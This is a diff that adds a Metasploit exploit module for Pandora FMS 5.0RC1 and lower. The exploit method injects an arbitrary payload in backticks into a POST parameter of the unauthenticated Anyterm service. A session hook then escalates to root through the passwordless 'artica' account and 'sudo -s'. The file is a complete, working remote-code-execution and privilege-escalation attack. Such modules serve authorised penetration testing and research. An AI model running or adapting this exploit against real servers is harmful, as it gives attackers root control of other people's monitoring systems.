@@ -1,0 +1,113 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::EXE
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Pandora FMS Remote Code Execution",
+      'Description'    => %q{
+        This module exploits a vulnerability found in Pandora FMS 5.0RC1 and lower.
+        It will leverage an unauthenticated command injection in the Anyterm service on
+        port 8023. Commands are executed as the user "pandora". In Pandora FMS 4.1 and 5.0RC1
+        the user "artica" is not assigned a password by default, which makes it possible to su
+        to this user from the "pandora" user. The "artica" user has access to sudo without a
+        password, which makes it possible to escalate privileges to root. However, Pandora FMS 4.0
+        and lower force a password for the "artica" user during installation.
+      },
+      'License'         => MSF_LICENSE,
+      'Author'          =>
+        [
+          'xistence <xistence[at]0x90.nl>' # Vulnerability discovery and Metasploit module
+        ],
+      'References'      =>
+        [
+        ],
+      'Payload'        =>
+        {
+          'BadChars' => "",
+          'Compat'      =>
+            {
+              'PayloadType' => 'cmd',
+              'RequiredCmd' => 'generic perl python',
+            }
+        },
+      'Platform'        => ['unix'],
+      'Arch'            => ARCH_CMD,
+      'Targets'         =>
+        [
+          ['Pandora 5.0RC1', {}]
+        ],
+      'Privileged'      => true,
+      'DisclosureDate'  => "Jan 29 2014",
+      'DefaultTarget'   => 0))
+
+    register_options(
+      [
+       Opt::RPORT(8023),
+       OptString.new('TARGETURI', [true, 'The base path to the Pandora instance', '/']),
+      ], self.class)
+  end
+
+  def on_new_session(client)
+    print_status("#{peer} - Trying to escalate privileges to root")
+    [
+      # ignore SIGHUP so the server doesn't kill our root shell
+      "trap '' HUP",
+      # Spawn a pty for su/sudo
+      "python -c 'import pty;pty.spawn(\"/bin/sh\")'",
+      # Su to the passwordless "artica" account
+      "su - artica",
+      # The "artica" use has sudo rights without the need for a
+      # password, thus gain root priveleges
+      "sudo -s",
+    ].each do |command|
+      vprint_status(command)
+      client.shell_write(command + "\n")
+    end
+
+    super
+  end
+
+  def check
+    # Check version
+    print_status("#{peer} - Trying to detect Pandora FMS Remote Gateway")
+
+    res = send_request_cgi({
+     'method' => 'GET',
+     'uri'    => normalize_uri(target_uri.path, "anyterm.html")
+    })
+
+    if res && res.code == 200 && res.body.include?("Pandora FMS Remote Gateway")
+      print_good("#{peer} - Pandora FMS Remote Gateway Detected!")
+      return Exploit::CheckCode::Detected
+    end
+
+    return Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    print_status("#{peer} - Sending payload")
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri.path, "/anyterm-module"),
+      'vars_post'   => {
+        'a'     => "open",
+        'p' => "`#{payload.encoded}`"
+      }
+    })
+
+    if !res || res.code != 200
+      fail_with(Failure::Unknown, "#{peer} - Unexpected response, exploit probably failed!")
+    end
+  end
+
+end
